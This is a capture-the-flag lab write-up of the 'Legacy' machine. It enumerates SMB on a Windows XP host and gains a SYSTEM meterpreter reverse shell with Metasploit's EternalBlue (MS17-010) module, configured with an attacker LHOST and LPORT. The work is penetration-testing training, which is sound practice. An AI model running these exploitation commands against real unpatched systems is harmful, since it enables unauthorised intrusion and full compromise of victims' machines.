---
description: Direct NT\SYSTEM shell using EternalBlue (MS17-010) on unpatched XP
---

# Legacy

## Summary

* Only three open ports: RPC (135), NetBIOS (139), and SMB (445).
* Host is running Windows XP with SMBv1 enabled.
* SMB enumeration confirmed the system is vulnerable to **MS17-010 (EternalBlue)**.
* Successfully exploited using **Metasploit’s `ms17_010_psexec`** module.
* Immediate **NT AUTHORITY\SYSTEM** access without needing credentials or privilege escalation steps.



## 🧵 Let's Unpack

***

### 🔍Enumeration

```
sudo nmap -sC -sV -A -T5 -p- 10.10.10.4
```

Key open ports:

* **135/tcp** → Microsoft Windows RPC
* **139/tcp** → NetBIOS Session Service
* **445/tcp** → Microsoft SMB

We further ran SMB-specific enumeration:

```
nmap --script "safe or smb-enum-*" -p 445 10.10.10.4
```

Results:

* OS: **Windows XP (Windows 2000 LAN Manager)**
* Hostname: **LEGACY**
* **MS17-010 (CVE-2017-0143)** vulnerability **confirmed**

**Checked using Metasploit:**

```
use auxiliary/scanner/smb/smb_ms17_010

> [+] 10.10.10.4:445 - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
```

### Exploitation (Initial Foothold)

Used Metasploit’s EternalBlue module:

```bash
use exploit/windows/smb/ms17_010_psexec
```

Configured options:

```bash
set RHOSTS 10.10.10.4
set LHOST 10.10.14.9
set LPORT 4444
run
```

Boom 💣 — Got a **meterpreter session** as **NT AUTHORITY\SYSTEM** instantly.











